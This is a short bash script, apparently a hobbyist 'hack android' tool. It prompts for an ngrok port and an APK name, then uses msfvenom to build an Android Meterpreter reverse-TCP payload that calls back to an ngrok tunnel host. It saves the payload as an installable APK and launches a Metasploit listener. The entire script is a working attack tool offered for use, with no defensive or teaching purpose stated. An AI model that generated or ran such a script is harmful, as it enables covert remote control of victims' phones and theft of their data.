echo 'METASPLOIT installed ??? ( yes / no )'
read -p '>> ' meta
if [ $meta = yes ]
then
echo 'new hack android ? ( yes / no ) '
read -p '>> ' check
     if [ $check = yes ]
     then
echo 'you must get port from ngrok tcp 8080'
echo LPORT: | lolcat
read -p '>> ' LPORT
echo Apk name: | lolcat
read -p '>> ' APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$LPORT R >/sdcard/$APK.apk & PID=$!
echo "Generating Apk.." | lolcat
printf "["
while kill -0 $PID 2> /dev/null; do
    printf  "▓"
    sleep 0.5
done
echo 'you must run this commamd to start: '
echo 'exploit' | lolcat
msfconsole -r auto.rc
     else
echo 'you must run this commamd to start: '
echo 'exploit' | lolcat
msfconsole -r auto.rc
     fi
else
cd
cd a
sh h-droid
fi
